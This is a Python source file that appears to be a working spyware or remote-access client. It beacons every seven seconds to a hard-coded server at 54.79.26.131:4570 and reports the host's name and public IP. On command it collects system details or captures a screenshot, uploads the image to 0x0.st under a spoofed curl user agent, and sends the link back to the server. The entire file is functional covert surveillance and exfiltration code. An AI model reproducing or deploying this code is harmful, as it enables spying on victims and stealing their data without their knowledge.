import platform
import socket
from requests import get
import requests
import time

# ╔════════════════════════════════════════════════════════════════════╗
# ║ > Here i am                                                        ║
# ╚════════════════════════════════════════════════════════════════════╝

ip = '54.79.26.131'
port = 4570

def send_pcinfo():
    system_info = platform.uname()
    node_name = system_info.node
    DeviceIP = get('https://api.ipify.org').text

    info = [
        ":PCINFO",
        node_name,
        f"System: {system_info.system}",
        f"Release: {system_info.release}",
        f"Version: {system_info.version}",
        f"Machine: {system_info.machine}",
        f"Processor: {system_info.processor}",
        f"IP: {DeviceIP}"
    ]

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send("\n".join(info).encode())
    s.close()

def send_screenshot():
    import pyautogui
    import tempfile

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    screenshot = pyautogui.screenshot()

    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
        temp_path = tmp.name
        screenshot.save(temp_path)

    file_path = temp_path

    headers = {
        'User-Agent': 'curl/7.68.0'
    }

    with open(file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post('https://0x0.st', headers=headers, files=files)

    if response.status_code == 200:
        system_info = platform.uname()
        node_name = system_info.node
        link = response.text.strip()
        screenshot = f":SCREENSHOT\n{node_name}\n{link}"
        s.send(screenshot.encode())
        s.close()

    else:
        s.close()

def main():
    system_info = platform.uname()
    node_name = system_info.node
    DeviceIP = get('https://api.ipify.org').text

    while True:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((ip, port))

            ping = f":CLIENTPING\n{node_name}\n{DeviceIP}"
            server.send(ping.encode())
            response = server.recv(4096).decode()

            if response.startswith(":COMMAND :GETINFO"):
                send_pcinfo()
            
            elif response.startswith(":COMMAND :GETSCREENSHOT"):
                send_screenshot()

            elif response.startswith("OTHER"):
                pass

            server.close()
        except Exception as e:
            print(f"[!] Error: {e}")

        time.sleep(7)

if __name__ == "__main__":
    main()
